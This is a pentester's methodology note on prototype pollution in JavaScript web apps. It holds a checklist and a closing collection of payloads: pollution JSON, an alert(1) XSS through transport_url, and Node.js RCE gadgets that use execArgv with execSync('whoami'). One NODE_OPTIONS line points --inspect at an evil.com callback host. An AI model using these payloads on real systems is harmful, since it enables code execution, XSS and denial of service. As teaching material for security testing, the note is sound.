---
title: "Prototype Pollution"
layout: notes
tags:
  - webapp
  - methodology
  - prototype-pollution
  - FI_javascript
  - Co_rce
  - Co_dos
  - Co_privilege-escalation
  - Co_xss
  - FI_parameters
  - FI_api
---
## Summary

As web applications have matured and developed JavaScript has become a staple of front and backend design. Inside of JavaScript everything is an object, and all objects have properties and prototypes. Each object is additionally created with a constructor that contains a prototype of base properties used to make the object. Each object will inherit properties from its prototype, 4 types exist: object, string, array, number. If a property is not defined under an object it will check the prototype, and each property or method in a prototype is inherited by all of its children. Inside of JavaScript if an attacker can pollute the prototype of an object all subsequent objects under the same prototype will inherit that property, allowing for [[XSS - JavaScript Injection]] on self-prototype pollution, and Remote Code Execution on server-side prototype pollution. 

The two take different methods as the developer console can inspect the DOM for changes whereas server-side properties such as "json spaces" needs to be used for testing. Put simply 3 parts to a successful prototype pollution attack exist: the source to pollute objects, the sink to allow for code execution, and a gadget passed into a sink improperly. After finding those a property can be polluted and the sink found can be abused in any way feasibly possible. Server-side prototype pollution can destroy the application in question, so caution is advised. When trying for remote code execution `child_process` is the module to execute code, through `fork()` and `spawn()`. `child_process` has `execSync()` to run system commands, and `fork()` has `execArgv` to evaluate expressions. 

## Methodology

**WARNING**: Making changes to the prototype within the DOM can impact how code runs. Worst case scenario it can crash the web application all together and causes serious downtime and headaches for a business. Unless you are absolutely certain that a payload will not cause an adverse effect, veer on the site of extreme caution.

When looking for Prototype Pollution vulnerabilities ask/try the following:
- [ ] **Is there any source to pollute?**
	- [ ] try checking parameters, API endpoints, POST data converted to JSON, etc..
	- [ ] **Am I getting JSON feedback?**
- [ ] **Can you find any sink or use for pollution?**
	- [ ] basic ones are `eval()` and `innerHTML` but keep an open eye and mind
	- [ ] **Is there a gadget to pass into that sink?**
- [ ] **Is this client side?**
	- [ ] try to pollute `__proto__[foo]=bar`
	- [ ] try scanning with DOM Invader
- [ ] **Is this server side?**
	- [ ] try to pollute `"__proto__":{"json spaces":1}` and observe any changes in raw view of burp
	- [ ] try `"__proto__":{"status":"555"}` and induce an error to test
		- [ ] removing a `"` from a JSON POST might cause an error to check for the proper JSON response
	- [ ] try to send `+AGYAbwBv-` and use `"__proto__":{"content-type":"application/json; charset=utf-7"}`
		- [ ] check for other encoding types if this doesn't work
- [ ] try `constructor.prototype` instead of `__proto__`
- [ ] try to bypass any filters by nesting
- [ ] **Is there Object.defineProperty() to prevent writing?**
	- [ ] overwrite the `value` property to whatever you want

<br>
CLIENT SIDE
- [ ] try to pop some XSS 

<br>
SERVER SIDE
- [ ] try to run RCE from the Tools/Examples
- [ ] change out the shell if no results but positive earlier results
		shell needs to be executable, and commands are run from a `-c`, ie stdin required
		curl can be tricked into reading stdin with `-d @-`
		xargs can be used to turn stdin into arguments

## Capabilities

Privilege Escalation  
Remote Code Execution  
Cross-Site Scripting  
Denial of Service  

## Found In

JavaScript  
Parameters  
APIs  

## Tools/Examples

setting property test in `__proto__` JSON
```
{"__proto__": {"test": true}}
{"__proto__[test]": true}
{"__proto__.test": true}
{"__proto__.name":"test"}

{"constructor": {"prototype": {"test": true}}}
{"constructor.prototype.test": true}
{"constructor": {"test": true}}
```

modifying `__proto__` itself JSON
```
{"__proto__": "test"}
{"__proto__": {}}
{"__proto__": null}
{"__proto__": []}
```

Misc Specific Stuff
```
# Prototype Chain Poisoning
{"constructor": {"prototype": {"__proto__": {"test": true}}}}

# Function Prototype Pollution
{"__proto__.constructor.prototype.test": true}

# Recursive Prototype Chain
{"__proto__.constructor.prototype.__proto__.test": true}

# Boolean Prototype
{"__proto__": {"constructor": {"prototype": {"test": true}}}}

# Constructor Pollution via Function
{"constructor": {"prototype": {"constructor": {"prototype": {"test": true}}}}}

# Combination Payloads
{"__proto__.test": true, "constructor.prototype.test": true}
```

more `__proto__` setting
```
Object.__proto__["test"] = true
Object.__proto__.test = true
Object.constructor.prototype.test = true
Object.constructor["prototype"]["test"] = true
```

setting test 
```
x[__proto__][test] = true
x.__proto__.test = true
__proto__[test] = true
__proto__.test = true
```

setting url for xss in script src
```
?search=&__proto__[transport_url]=data:,alert(1);
```

fetch() sink exploitation
```
__proto__[headers][injected_header]=bar
```

RCE examples in node.js
```
"shell":"node"
"NODE_OPTIONS":"--inspect=dns\"\".evil\"\".com"

"execArgv":["--eval=require('child_process').execSync('whoami')"]

"shell":"vim",
"input":":! whoami\n"
```

![3689-article-prototype-pollution-prototype-chain.svg](/img/webapp_notes/3689-article-prototype-pollution-prototype-chain.svg)